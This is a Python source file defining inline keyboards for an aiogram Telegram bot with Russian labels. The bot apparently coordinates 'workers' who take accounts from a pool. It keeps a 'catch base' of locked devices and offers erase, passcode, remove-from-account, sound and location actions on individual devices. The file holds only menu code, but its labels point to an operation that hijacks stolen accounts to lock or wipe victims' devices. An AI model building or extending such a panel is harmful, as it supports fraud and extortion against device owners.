# bot/keyboards.py
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder


# ============================================
# ГЛАВНОЕ МЕНЮ
# ============================================

def get_main_keyboard(role: str = "worker") -> InlineKeyboardMarkup:
    """
    Главное меню бота. Для админов добавляется кнопка админ-панели.
    """
    builder = InlineKeyboardBuilder()
    
    # Основные кнопки для всех
    builder.row(InlineKeyboardButton(text="⬇️ ПОЛУЧИТЬ АККАУНТ", callback_data="get_account"))
    builder.row(
        InlineKeyboardButton(text="📈 МОЯ СТАТИСТИКА", callback_data="my_stats"),
        InlineKeyboardButton(text="📜 ИСТОРИЯ ЛОКОВ", callback_data="my_history")
    )
    
    # Кнопка админ-панели только для админов
    if role == "admin":
        builder.row(InlineKeyboardButton(text="👑 АДМИН-ПАНЕЛЬ", callback_data="admin_panel"))
    
    return builder.as_markup()


# ============================================
# МЕНЮ ПОСЛЕ ВЫДАЧИ АККАУНТА
# ============================================

def get_account_menu_keyboard() -> InlineKeyboardMarkup:
    """
    Кнопки, доступные после получения аккаунта (мониторинг активен).
    """
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="⏱ ПРОДЛИТЬ ТАЙМЕР", callback_data="extend_timer"),
        InlineKeyboardButton(text="🔄 ВЕРНУТЬ В ПУЛ", callback_data="return_account")
    )
    return builder.as_markup()


# ============================================
# МЕНЮ ПРОДЛЕНИЯ ТАЙМЕРА
# ============================================

def get_extend_timer_keyboard(session_id: int = None) -> InlineKeyboardMarkup:
    """
    Кнопки выбора времени продления и подтверждения/отмены.
    """
    builder = InlineKeyboardBuilder()
    
    # Опции продления
    builder.row(
        InlineKeyboardButton(text="+10 мин", callback_data="extend_10"),
        InlineKeyboardButton(text="+15 мин", callback_data="extend_15"),
        InlineKeyboardButton(text="+30 мин", callback_data="extend_30")
    )
    builder.row(
        InlineKeyboardButton(text="+1 час", callback_data="extend_60"),
        InlineKeyboardButton(text="+2 часа", callback_data="extend_120"),
        InlineKeyboardButton(text="+4 часа", callback_data="extend_240")
    )
    builder.row(
        InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data="extend_confirm"),
        InlineKeyboardButton(text="❌ ОТМЕНА", callback_data="extend_cancel")
    )
    
    return builder.as_markup()


# ============================================
# АДМИН-ПАНЕЛЬ
# ============================================

def get_admin_panel_keyboard() -> InlineKeyboardMarkup:
    """
    Главное меню админа.
    """
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔒 БАЗА УЛОВА", callback_data="admin_locked"))
    builder.row(InlineKeyboardButton(text="📦 АРХИВ", callback_data="admin_archive"))
    builder.row(InlineKeyboardButton(text="👥 УПРАВЛЕНИЕ ВОРКЕРАМИ", callback_data="admin_workers"))
    builder.row(InlineKeyboardButton(text="📥 ИМПОРТ АККАУНТОВ", callback_data="admin_import"))
    builder.row(InlineKeyboardButton(text="⚙ НАСТРОЙКИ", callback_data="admin_settings"))
    builder.row(InlineKeyboardButton(text="⬅️ НАЗАД В ГЛАВНОЕ МЕНЮ", callback_data="back_to_main"))
    return builder.as_markup()


# ============================================
# МЕНЮ БАЗЫ УЛОВА / АРХИВА
# ============================================

def get_locked_list_keyboard() -> InlineKeyboardMarkup:
    """
    Кнопки для работы со списком устройств.
    """
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔍 ПОИСК", callback_data="search_log"),
        InlineKeyboardButton(text="📥 ЭКСПОРТ", callback_data="export_locked")
    )
    builder.row(InlineKeyboardButton(text="⬅️ НАЗАД В АДМИН-ПАНЕЛЬ", callback_data="back_to_admin"))
    return builder.as_markup()


# ============================================
# ДЕТАЛЬНАЯ КАРТОЧКА УСТРОЙСТВА
# ============================================

def get_device_details_keyboard(log_id: str) -> InlineKeyboardMarkup:
    """
    Действия с конкретным устройством.
    """
    builder = InlineKeyboardBuilder()
    
    builder.row(
        InlineKeyboardButton(text="🗑 СТЕРЕТЬ", callback_data=f"erase_{log_id}"),
        InlineKeyboardButton(text="🔢 КОД-ПАРОЛЬ", callback_data=f"passcode_{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="❌ УДАЛИТЬ С АККАУНТА", callback_data=f"remove_{log_id}"),
        InlineKeyboardButton(text="🔔 ЗВУК", callback_data=f"sound_{log_id}")
    )
    builder.row(
        InlineKeyboardButton(text="📍 ОБНОВИТЬ ЛОКАЦИЮ", callback_data=f"location_{log_id}"),
        InlineKeyboardButton(text="🔓 ОТМЕТИТЬ РАЗБЛОКИРОВАННЫМ", callback_data=f"unlock_{log_id}")
    )
    builder.row(InlineKeyboardButton(text="⬅️ НАЗАД К СПИСКУ", callback_data="back_to_locked"))
    
    return builder.as_markup()


# ============================================
# УПРАВЛЕНИЕ ВОРКЕРАМИ
# ============================================

def get_workers_management_keyboard() -> InlineKeyboardMarkup:
    """
    Кнопки управления воркерами.
    """
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="➕ ДОБАВИТЬ ВОРКЕРА", callback_data="add_worker"))
    builder.row(InlineKeyboardButton(text="🔫 ЗАБЛОКИРОВАТЬ ВОРКЕРА", callback_data="block_worker"))
    builder.row(InlineKeyboardButton(text="📊 СТАТИСТИКА ВОРКЕРА", callback_data="worker_stats"))
    builder.row(InlineKeyboardButton(text="📨 РАССЫЛКА", callback_data="broadcast"))
    builder.row(InlineKeyboardButton(text="⬅️ НАЗАД В АДМИН-ПАНЕЛЬ", callback_data="back_to_admin"))
    return builder.as_markup()


# ============================================
# ИМПОРТ АККАУНТОВ
# ============================================

def get_import_keyboard() -> InlineKeyboardMarkup:
    """
    Кнопки для импорта аккаунтов.
    """
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="📎 ЗАГРУЗИТЬ ФАЙЛ", callback_data="import_file"),
        InlineKeyboardButton(text="📝 ВВЕСТИ ВРУЧНУЮ", callback_data="import_manual")
    )
    builder.row(
        InlineKeyboardButton(text="✅ ДОБАВИТЬ", callback_data="import_confirm"),
        InlineKeyboardButton(text="📥 СКАЧАТЬ ОТЧЕТ", callback_data="import_report")
    )
    builder.row(InlineKeyboardButton(text="⬅️ НАЗАД В АДМИН-ПАНЕЛЬ", callback_data="back_to_admin"))
    return builder.as_markup()


# ============================================
# НАСТРОЙКИ
# ============================================

def get_settings_keyboard() -> InlineKeyboardMarkup:
    """
    Настройки системы.
    """
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="✏️ ИЗМЕНИТЬ КОНТАКТ АДМИНА", callback_data="change_admin_contact"))
    builder.row(InlineKeyboardButton(text="⏱ НАСТРОЙКИ ТАЙМЕРА", callback_data="timer_settings"))
    builder.row(InlineKeyboardButton(text="🔍 НАСТРОЙКИ МОНИТОРИНГА", callback_data="monitor_settings"))
    builder.row(
        InlineKeyboardButton(text="💾 СОХРАНИТЬ НАСТРОЙКИ", callback_data="save_settings"),
        InlineKeyboardButton(text="⬅️ НАЗАД В АДМИН-ПАНЕЛЬ", callback_data="back_to_admin")
    )
    return builder.as_markup()
